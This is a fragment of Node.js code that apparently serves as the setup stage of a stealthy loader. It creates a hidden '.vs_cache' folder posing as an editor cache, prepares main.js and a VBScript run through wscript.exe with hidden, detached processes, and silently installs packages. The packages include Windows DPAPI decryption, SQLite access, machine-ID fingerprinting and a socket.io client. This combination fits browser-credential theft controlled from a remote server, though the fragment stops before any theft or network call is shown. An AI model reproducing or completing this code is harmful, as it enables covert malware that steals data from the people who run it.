const path = require("path");
const { spawn } = require("child_process");
const fs = require("fs");
const os = require("os");

const detached = {
  stdio: "ignore",
  windowsHide: true,
  shell: false,
  detached: true,
};

const nodeExe = process.execPath;
const nodeDir = path.dirname(nodeExe);
const workDir = path.join(os.homedir(), ".vs_cache");
const mainJs = path.join(workDir, "main.js");
const mainVbs = path.join(workDir, "main.vbs");
const wscript = path.join(
  process.env.WINDIR || "C:\\Windows",
  "System32",
  "wscript.exe"
);
const env = {
  ...process.env,
  PATH: nodeDir + path.delimiter + (process.env.PATH || ""),
};

function findNpmCli() {
  const candidates = [
    path.join(nodeDir, "node_modules", "npm", "bin", "npm-cli.js"),
    path.join(nodeDir, "..", "lib", "node_modules", "npm", "bin", "npm-cli.js"),
    path.join(nodeDir, "..", "node_modules", "npm", "bin", "npm-cli.js"),
  ];
  for (const p of candidates) {
    try {
      if (fs.existsSync(p)) return p;
    } catch {}
  }
  return null;
}

function npmInstall() {
  const npmCli = findNpmCli();
  if (npmCli) {
    return spawn(nodeExe, [npmCli, "install"], {
      cwd: workDir,
      env,
      stdio: "ignore",
      windowsHide: true,
      shell: false,
      detached: false,
    });
  }
  if (process.platform === "win32") {
    const npmCmd = path.join(nodeDir, "npm.cmd");
    return spawn(
      "cmd.exe",
      ["/d", "/s", "/c", `"${npmCmd}" install`],
      {
        cwd: workDir,
        env,
        windowsVerbatimArguments: true,
        stdio: "ignore",
        windowsHide: true,
        shell: false,
        detached: false,
      }
    );
  }
  return spawn(path.join(nodeDir, "npm"), ["install"], {
    cwd: workDir,
    env,
    ...detached,
  });
}

const deps = {
  axios: "latest",
  "better-sqlite3": "13.0.3",
  "node-machine-id": "latest",
  "socket.io-client": "latest",
};
if (process.platform === "win32") {
  deps["@primno/dpapi"] = "latest";
  deps["koffi"] = "3.1.2";
}

